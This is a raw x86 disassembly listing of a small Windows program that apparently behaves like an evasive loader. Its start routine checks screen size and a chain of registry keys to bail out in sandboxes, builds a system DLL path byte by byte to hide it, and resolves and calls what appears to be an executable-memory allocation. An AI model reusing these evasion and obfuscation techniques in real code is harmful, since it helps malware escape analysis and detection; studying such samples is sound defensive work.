0x00401000:	pushl	%ebp	; from: 0x0040143a(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	movl	$0x40620d, 0x004022e8
0x0040100d:	popl	%ebp
0x0040100e:	ret	; targets: 0x0040143f(MAY)

0x00401020:	pushl	%ebp	; from: 0x00401446(MAY)
0x00401021:	movl	%esp, %ebp
0x00401023:	movl	0x8(%ebp), %eax
0x00401026:	movl	-4(%eax), %eax
0x00401029:	popl	%ebp
0x0040102a:	ret	; targets: 0x0040144b(MAY)

0x00401100:	pushl	%ebp	; from: 0x0040145b(MAY)
0x00401101:	movl	%esp, %ebp
0x00401103:	subl	$0x8, %esp
0x00401106:	movl	$0x4, -4(%ebp)
0x0040110d:	pushl	$0x40206c
0x00401112:	pushl	$0x40207c
0x00401117:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000060(MAY)
0x0040111d:	pushl	%eax
0x0040111e:	call	GetProcAddress@kernel32.dll	; targets: 0xff000010(MAY)
0x00401124:	movl	%eax, -8(%ebp)
0x00401127:	pushl	$0x40
0x00401129:	pushl	$0x3000
0x0040112e:	movl	0x8(%ebp), %eax
0x00401131:	pushl	%eax
0x00401132:	pushl	$0x0
0x00401134:	call	-8(%ebp)	; targets: unresolved

start:
0x00401220:	pushl	%ebp
0x00401221:	movl	%esp, %ebp
0x00401223:	subl	$0x170, %esp
0x00401229:	pusha	
0x0040122a:	movl	%ebp, 0x004022f0
0x00401230:	movl	$0x0, -324(%ebp)
0x0040123a:	movl	CreateFileA@kernel32.dll, %eax
0x0040123f:	movl	%eax, -344(%ebp)
0x00401245:	movl	$0x0, -276(%ebp)
0x0040124f:	movl	$0x64, -316(%ebp)
0x00401259:	movl	$0x1, -284(%ebp)
0x00401263:	movl	$0x0, -324(%ebp)
0x0040126d:	movl	$0x0, -292(%ebp)
0x00401277:	movl	$0x1, -312(%ebp)
0x00401281:	movl	$0x3, -280(%ebp)
0x0040128b:	movl	$0x0, -276(%ebp)
0x00401295:	movl	$0x64, -316(%ebp)
0x0040129f:	movl	$0x1, -284(%ebp)
0x004012a9:	movl	$0x0, -324(%ebp)
0x004012b3:	movl	$0x0, -292(%ebp)
0x004012bd:	movl	$0x1, -312(%ebp)
0x004012c7:	movl	$0x3, -280(%ebp)
0x004012d1:	pushl	$0x104
0x004012d6:	leal	-272(%ebp), %ecx
0x004012dc:	pushl	%ecx
0x004012dd:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000050(MAY)
0x004012e3:	call	0x00401700	; targets: 0x00401700(MAY)
0x004012e8:	pushl	$0x1	; from: 0x004017a7(MAY)
0x004012ea:	call	GetSystemMetrics@user32.dll	; targets: 0xff000040(MAY)
0x004012f0:	cmpl	$0xc8, %eax
0x004012f5:	jnl	0x004012fe	; targets: 0x004012f7(MAY), 0x004012fe(MAY)
0x004012f7:	xorl	%eax, %eax	; from: 0x004012f5(MAY)
0x004012f9:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x004012fe:	movl	RegOpenKeyExW@advapi32.dll, %edx	; from: 0x004012f5(MAY)
0x00401304:	movl	%edx, -348(%ebp)
0x0040130a:	leal	-296(%ebp), %eax
0x00401310:	pushl	%eax
0x00401311:	pushl	$0x20019
0x00401316:	pushl	$0x0
0x00401318:	pushl	$0x402088
0x0040131d:	pushl	$0x80000002
0x00401322:	call	-348(%ebp)	; targets: 0xff000030(MAY)
0x00401328:	testl	%eax, %eax
0x0040132a:	je	0x0040133b	; targets: 0x0040132c(MAY), 0x0040133b(MAY)
0x0040132c:	pushl	$0x4	; from: 0x0040132a(MAY)
0x0040132e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000080(MAY)
0x00401334:	xorl	%eax, %eax
0x00401336:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x0040133b:	leal	-296(%ebp), %ecx	; from: 0x0040132a(MAY)
0x00401341:	pushl	%ecx
0x00401342:	pushl	$0x20019
0x00401347:	pushl	$0x0
0x00401349:	pushl	$0x40209c
0x0040134e:	movl	-296(%ebp), %edx
0x00401354:	pushl	%edx
0x00401355:	call	-348(%ebp)	; targets: 0xff000030(MAY)
0x0040135b:	testl	%eax, %eax
0x0040135d:	je	0x0040136e	; targets: 0x0040135f(MAY), 0x0040136e(MAY)
0x0040135f:	pushl	$0x4	; from: 0x0040135d(MAY)
0x00401361:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000080(MAY)
0x00401367:	xorl	%eax, %eax
0x00401369:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x0040136e:	leal	-296(%ebp), %eax	; from: 0x0040135d(MAY)
0x00401374:	pushl	%eax
0x00401375:	pushl	$0x20019
0x0040137a:	pushl	$0x0
0x0040137c:	pushl	$0x4020ac
0x00401381:	movl	-296(%ebp), %ecx
0x00401387:	pushl	%ecx
0x00401388:	call	-348(%ebp)	; targets: 0xff000030(MAY)
0x0040138e:	testl	%eax, %eax
0x00401390:	je	0x004013a1	; targets: 0x004013a1(MAY), 0x00401392(MAY)
0x00401392:	pushl	$0x4	; from: 0x00401390(MAY)
0x00401394:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000080(MAY)
0x0040139a:	xorl	%eax, %eax
0x0040139c:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x004013a1:	leal	-296(%ebp), %edx	; from: 0x00401390(MAY)
0x004013a7:	pushl	%edx
0x004013a8:	pushl	$0x20019
0x004013ad:	pushl	$0x0
0x004013af:	pushl	$0x4020b8
0x004013b4:	movl	-296(%ebp), %eax
0x004013ba:	pushl	%eax
0x004013bb:	call	-348(%ebp)	; targets: 0xff000030(MAY)
0x004013c1:	testl	%eax, %eax
0x004013c3:	je	0x004013d4	; targets: 0x004013d4(MAY), 0x004013c5(MAY)
0x004013c5:	pushl	$0x4	; from: 0x004013c3(MAY)
0x004013c7:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000080(MAY)
0x004013cd:	xorl	%eax, %eax
0x004013cf:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x004013d4:	leal	-296(%ebp), %ecx	; from: 0x004013c3(MAY)
0x004013da:	pushl	%ecx
0x004013db:	pushl	$0x20019
0x004013e0:	pushl	$0x0
0x004013e2:	pushl	$0x402108
0x004013e7:	movl	-296(%ebp), %edx
0x004013ed:	pushl	%edx
0x004013ee:	call	-348(%ebp)	; targets: 0xff000030(MAY)
0x004013f4:	testl	%eax, %eax
0x004013f6:	je	0x00401407	; targets: 0x004013f8(MAY), 0x00401407(MAY)
0x004013f8:	pushl	$0x4	; from: 0x004013f6(MAY)
0x004013fa:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000080(MAY)
0x00401400:	xorl	%eax, %eax
0x00401402:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x00401407:	leal	-296(%ebp), %eax	; from: 0x004013f6(MAY)
0x0040140d:	pushl	%eax
0x0040140e:	pushl	$0x20019
0x00401413:	pushl	$0x0
0x00401415:	pushl	$0x40213c
0x0040141a:	movl	-296(%ebp), %ecx
0x00401420:	pushl	%ecx
0x00401421:	call	-348(%ebp)	; targets: 0xff000030(MAY)
0x00401427:	testl	%eax, %eax
0x00401429:	jne	0x0040143a	; targets: 0x0040143a(MAY), 0x0040142b(MAY)
0x0040142b:	pushl	$0x4	; from: 0x00401429(MAY)
0x0040142d:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000080(MAY)
0x00401433:	xorl	%eax, %eax
0x00401435:	jmp	0x004016f2	; targets: 0x004016f2(MAY)
0x0040143a:	call	0x00401000	; targets: 0x00401000(MAY)	; from: 0x00401429(MAY)
0x0040143f:	movl	0x004022e8, %edx	; from: 0x0040100e(MAY)
0x00401445:	pushl	%edx
0x00401446:	call	0x00401020	; targets: 0x00401020(MAY)
0x0040144b:	addl	$0x4, %esp	; from: 0x0040102a(MAY)
0x0040144e:	movl	%eax, -328(%ebp)
0x00401454:	movl	-328(%ebp), %eax
0x0040145a:	pushl	%eax
0x0040145b:	call	0x00401100	; targets: 0x00401100(MAY)
0x004016f2:	movl	%ebp, %esp	; from: 0x0040139c(MAY), 0x00401435(MAY), 0x00401336(MAY), 0x004012f9(MAY), 0x00401402(MAY), 0x004013cf(MAY), 0x00401369(MAY)
0x004016f4:	popl	%ebp
0x004016f5:	ret	; targets: 0xfee70000(MAY)

0x00401700:	pushl	%ebp	; from: 0x004012e3(MAY)
0x00401701:	movl	%esp, %ebp
0x00401703:	movl	0x00402014, %eax
0x00401708:	movb	$0x73, 0x3(%eax)
0x0040170c:	movl	0x00402014, %ecx
0x00401712:	movb	$0x74, 0x4(%ecx)
0x00401716:	movl	0x00402014, %edx
0x0040171c:	movb	$0x65, 0x5(%edx)
0x00401720:	movl	0x00402014, %eax
0x00401725:	movb	$0x6d, 0x6(%eax)
0x00401729:	movl	0x00402014, %ecx
0x0040172f:	movb	$0x33, 0x7(%ecx)
0x00401733:	movl	0x00402014, %edx
0x00401739:	movb	$0x32, 0x8(%edx)
0x0040173d:	movl	0x00402014, %eax
0x00401742:	movb	$0x5c, 0x9(%eax)
0x00401746:	movl	0x00402014, %ecx
0x0040174c:	movb	$0x61, 0xa(%ecx)
0x00401750:	movl	0x00402014, %edx
0x00401756:	movb	$0x74, 0xb(%edx)
0x0040175a:	movl	0x00402014, %eax
0x0040175f:	movb	$0x6c, 0xc(%eax)
0x00401763:	movl	0x00402014, %ecx
0x00401769:	movb	$0x2e, 0xd(%ecx)
0x0040176d:	movl	0x00402014, %edx
0x00401773:	movb	$0x64, 0xe(%edx)
0x00401777:	movl	0x00402014, %eax
0x0040177c:	movb	$0x6c, 0xf(%eax)
0x00401780:	movl	0x00402014, %ecx
0x00401786:	movb	$0x6c, 0x10(%ecx)
0x0040178a:	movl	0x00402014, %edx
0x00401790:	movb	$0x5c, (%edx)
0x00401793:	movl	0x00402014, %eax
0x00401798:	movb	$0x73, 0x1(%eax)
0x0040179c:	movl	0x00402014, %ecx
0x004017a2:	movb	$0x79, 0x2(%ecx)
0x004017a6:	popl	%ebp
0x004017a7:	ret	; targets: 0x004012e8(MAY)

